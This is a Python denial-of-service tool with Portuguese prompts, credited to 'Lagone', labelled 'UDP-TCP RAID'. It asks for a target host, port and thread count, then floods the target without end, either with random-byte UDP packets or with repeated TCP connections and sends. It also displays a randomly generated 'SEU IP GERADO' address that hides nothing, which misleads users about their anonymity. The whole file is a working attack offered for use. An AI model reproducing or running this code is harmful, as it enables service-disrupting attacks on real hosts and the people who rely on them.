#Codigo UDP-TCP flood feito por Lagone 



import random
ip1 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])
ip2 = random.choice([1, 8, 7, 6, 5, 4, 3, 2, 9])
ip22 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip11 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])

ipgerado = (f'182.21.{ip11}{ip22}.{ip1}{ip2}')

import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet UDP-TCP RAID")
print("\033[1;33;40m (PRESSIONE ENTER)\n")
print (f'SEU IP GERADO: {ipgerado}')

print("\033[1;32;40m ==> Codigo por Lagone <==  \n")
test = input()
if test == "n":
	exit(0)
ip = str(input(" Host/Ip: "))
port = int(input(" Porta: "))
choice = str(input(" UDP(s/n): "))
times = int(input(" Pacotes por conexao: "))
threads = int(input(" Threads: "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[🐍]","[🐍]","[🐍]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i + " FLOOD " + ip)
		except:
			s.close()
			print("[!] Erro!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[🐍]","[🐍]","[🐍]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TCP ATTACK " + ip)
		except:
			s.close()
			print("[*] Erro")

for y in range(threads):
	if choice == 's':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 's':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Voce estava usando TCP ou UDP")
    print("aperte 1 para UDP aperte 2 para TCP")
    whereman = str(input(" 1 ou 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("Voce esta saindo")
	sys.exit(130)

def exit_gracefully(signum, frame):
   
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" saindo ?:"))
        if exitc == 's':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

  
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
